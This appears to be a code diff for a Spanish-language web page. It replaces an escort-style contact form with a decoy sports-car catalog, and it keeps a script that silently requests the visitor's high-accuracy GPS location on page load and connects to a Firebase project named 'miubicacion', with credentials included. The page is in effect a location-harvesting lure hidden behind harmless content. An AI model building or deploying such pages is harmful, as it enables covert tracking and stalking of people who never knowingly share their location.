@@ -3,65 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacto | Prepagos UIO</title>
+    <title>Mundo Deportivo - Autos de Alta Gama</title>
     
-    <!-- SDK de Firebase en modo compatibilidad -->
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>
 
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', Arial, sans-serif; }
-        body { background-color: #111111; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .contact-container { background-color: #1a1a1a; width: 100%; max-width: 450px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.6); border: 1px solid #2a2a2a; text-align: center; }
-        h2 { font-size: 28px; margin-bottom: 10px; font-weight: 600; letter-spacing: 1px; color: #ffffff; }
-        p.subtitle { color: #888888; font-size: 14px; margin-bottom: 30px; }
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 12px; text-transform: uppercase; color: #aaaaaa; margin-bottom: 6px; font-weight: bold; letter-spacing: 0.5px; }
-        input[type="text"], input[type="email"], input[type="tel"], textarea { width: 100%; padding: 12px; background-color: #262626; border: 1px solid #3a3a3a; border-radius: 6px; color: #ffffff; font-size: 14px; transition: border 0.3s ease; }
-        input:focus, textarea:focus { border-color: #ffffff; outline: none; background-color: #2d2d2d; }
-        textarea { resize: none; height: 100px; }
-        .btn-submit { width: 100%; background-color: #ffffff; color: #111111; border: none; padding: 14px; border-radius: 6px; font-size: 14px; font-weight: bold; text-transform: uppercase; cursor: pointer; letter-spacing: 1px; margin-top: 10px; transition: background 0.3s ease; }
-        .btn-submit:hover { background-color: #e6e6e6; }
-        footer { margin-top: 30px; font-size: 11px; color: #555555; letter-spacing: 0.5px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #0b0c10; color: #c5c6c7; }
+        header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; }
+        header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
+        header h1 span { color: #ff003c; }
+        nav a { color: #ffffff; text-decoration: none; margin-left: 20px; font-weight: bold; text-transform: uppercase; }
+        .hero { background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://images.unsplash.com/photo-1503376780353-7e6692767b70?q=80&w=1200') no-repeat center center/cover; height: 400px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .hero h2 { font-size: 42px; color: #fff; margin-bottom: 10px; text-transform: uppercase; }
+        .hero p { font-size: 18px; color: #66fcf1; margin-bottom: 20px; }
+        .container { max-width: 1100px; margin: 40px auto; padding: 0 20px; }
+        .section-title { text-align: center; font-size: 28px; margin-bottom: 30px; text-transform: uppercase; color: #fff; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
+        .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
+        .card img { width: 100%; height: 200px; object-fit: cover; }
+        .card-content { padding: 20px; }
+        footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
 
-    <div class="contact-container">
-        <h2>CONTACTANOS</h2>
-        <p class="subtitle">Déjanos tus datos para ponernos en contacto contigo a la brevedad.</p>
-        
-        <form onsubmit="event.preventDefault(); alert('Mensaje enviado con éxito. Nos comunicaremos pronto.');">
-            <div class="form-group">
-                <label>Nombre Completo</label>
-                <input type="text" placeholder="Ej. Juan Pérez" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Correo Electrónico</label>
-                <input type="email" placeholder="nombre@correo.com" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Teléfono / WhatsApp</label>
-                <input type="tel" placeholder="Ej. 099XXXXXXX" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Mensaje o Consulta</label>
-                <textarea placeholder="Escribe tu mensaje aquí..."></textarea>
-            </div>
-            
-            <button type="submit" class="btn-submit">Enviar Mensaje</button>
-        </form>
+    <header>
+        <h1>ZONA<span>MOTOR</span></h1>
+        <nav>
+            <a href="#">Inicio</a>
+            <a href="#">Modelos</a>
+            <a href="#">Contacto</a>
+        </nav>
+    </header>
 
-        <footer>
-            &copy; 2026 Prepagos UIO. Todos los derechos reservados.
-        </footer>
-    </div>
+    <section class="hero">
+        <h2>Adrenalina y Velocidad</h2>
+        <p>Descubre la ingenieria y el diseno de los superdeportivos mas iconicos del mundo.</p>
+    </section>
+
+    <main class="container">
+        <h2 class="section-title">Modelos Destacados</h2>
+        <div class="grid">
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?q=80&w=400">
+                <div class="card-content">
+                    <h3>Superdeportivo Clasico</h3>
+                    <p>Diseno aerodinamico italiano con un motor V8 capaz de romper cualquier record de velocidad.</p>
+                </div>
+            </div>
+            <div class="card">
+                <img src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?q=80&w=400">
+                <div class="card-content">
+                    <h3>Tecnologia Urbana</h3>
+                    <p>Equipamiento moderno de fibra de carbono enfocado en la agilidad urbana.</p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 ZonaMotor. Catálogo de Exhibición Privada.</p>
+    </footer>
 
     <script>
-        // Configuración exacta extraída de tus capturas previas de Firebase
+        // Clonado exactamente de tu ultima captura de pantalla
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
             authDomain: "miubicacion-52e7f.firebaseapp.com",
@@ -69,19 +76,20 @@
             projectId: "miubicacion-52e7f",
             storageBucket: "miubicacion-52e7f.firebasestorage.app",
             messagingSenderId: "847245935895",
-            appId: "1:847245935895:web:e9576ba5280ac05b22e352"
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
+            measurementId: "G-GE5FVZMQXP"
         };
 
         // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Solicitar localización silenciosa al cargar la interfaz
+        // Disparador del GPS al cargar la pagina
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(siPermitio, noPermitio, {
                     enableHighAccuracy: true,
-                    timeout: 12000 // 12 segundos para mitigar el timeout error_codigo 3 anterior
+                    timeout: 10000
                 });
             }
         };
@@ -104,4 +112,4 @@
         }
     </script>
 </body>
-</html>
+</html
